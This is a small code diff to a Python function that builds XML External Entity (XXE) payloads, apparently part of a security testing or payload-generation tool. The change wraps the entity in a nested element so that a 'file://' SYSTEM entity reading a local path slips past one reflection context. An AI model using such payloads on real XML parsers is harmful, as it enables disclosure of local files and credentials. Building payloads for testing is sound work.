@@ -184,9 +184,11 @@ def _xxe_payload(params: Mapping[str, object], path: str) -> str:
     ctx = params.get("entity_context", "element_content")
     if ctx == "wrapped_root":
         root = params["root_element"]
+        # Nest the entity inside the sampled child (depth >= 2) so it slips past
+        # element_content, which reflects only the root's direct (depth-1) text.
         return (
-            f'<!DOCTYPE {root} [<!ENTITY e SYSTEM "file://{path}">]>'
-            f"<{root}>&e;</{root}>"
+            f'<!DOCTYPE wrapper [<!ENTITY e SYSTEM "file://{path}">]>'
+            f"<wrapper><{root}>&e;</{root}></wrapper>"
         )
     if ctx == "scheme_prefix":
         scheme = params["uri_scheme"]
